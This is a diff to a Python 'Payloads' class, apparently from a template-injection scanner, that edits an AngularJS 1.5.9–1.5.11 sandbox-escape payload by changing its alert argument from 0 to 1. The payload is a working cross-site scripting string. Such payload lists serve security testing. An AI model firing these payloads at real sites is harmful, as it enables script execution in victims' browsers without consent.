@@ -134,7 +134,7 @@ class Payloads:
         {
             "min": "1.5.9",
             "max": "1.5.11",
-            "value": """{{s=[].push;b=s.bind;c=http://s.call ;c.$apply=$apply;c.$eval=b;$digest=s;C=c.$apply(c);$$phase=0;B=C(b,c,b);$evalAsync("y=pop();y.type='UnaryExpression';y.operator='alert';y.argument=0");l=B($$asyncQueue.pop().expression);s.apply=B(C,0,l);$eval("s(q)")}}""",
+            "value": """{{s=[].push;b=s.bind;c=http://s.call ;c.$apply=$apply;c.$eval=b;$digest=s;C=c.$apply(c);$$phase=0;B=C(b,c,b);$evalAsync("y=pop();y.type='UnaryExpression';y.operator='alert';y.argument=1");l=B($$asyncQueue.pop().expression);s.apply=B(C,0,l);$eval("s(q)")}}""",
             "message": None
         },
         {
